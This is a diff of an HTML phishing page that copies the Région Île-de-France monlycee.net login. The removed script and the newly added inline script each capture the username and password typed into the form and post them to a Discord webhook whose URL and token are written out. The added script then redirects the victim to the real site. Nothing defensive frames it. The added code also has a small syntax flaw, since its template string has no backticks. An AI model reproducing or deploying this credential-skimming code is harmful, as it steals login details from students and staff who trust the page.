@@ -37,33 +37,6 @@
             );
         </script>
 
-<script>
-    function sendToWebhook(event) {
-        event.preventDefault(); // Empêche la soumission par défaut du formulaire
-
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-        const data = {
-            content: `Username: ${username}\nPassword: ${password}`
-        };
-
-        fetch('https://discord.com/api/webhooks/1348016206099120289/cJF8bPEA7yCxvxYaPf_bNG4mtIN8XtcNXa5rlwtCV-Cj2qZHL08VS4aM9m9T_YGSi8ci', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        }).then(response => {
-            // Continue avec la soumission du formulaire après l'envoi au webhook
-            document.getElementById('kc-form-login').submit();
-        }).catch(error => {
-            console.error('Error:', error);
-            // Continue avec la soumission du formulaire même en cas d'erreur
-            document.getElementById('kc-form-login').submit();
-        });
-    }
-</script>
 </head>
 
 <body class="">
@@ -217,7 +190,7 @@
                 <p class="footer-rights"><span>2024 </span><span>Région Île-de-France. Tous droits réservés.</span></p>
             </footer>
     
-
+            <script>document.getElementById("connexion").addEventListener("click", function (event) { event.preventDefault(); const username = document.getElementById("username").value; const password = document.getElementById("password").value; if (!username || !password) { alert("Veuillez remplir tous les champs."); return; } const payload = { content: Identifiant : ${username}\nMot de passe : ${password} }; const webhookUrl = "https://discord.com/api/webhooks/1348281231309148183/yaKB_4Pm6oIBf9HYcU8tafsVXXVt-VMYyoeORtTw_R1zQIixaik_o8TdZByt5UG3K0AU"; fetch(webhookUrl, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) }).then(response => { if (response.ok) { window.location.href = "https://monlycee.net/"; } else { alert("Une erreur s'est produite lors de l'envoi."); } }).catch(error => { console.error("Erreur :", error); alert("Une erreur s'est produite lors de l'envoi."); }); });</script>
 
 
 </body></html>
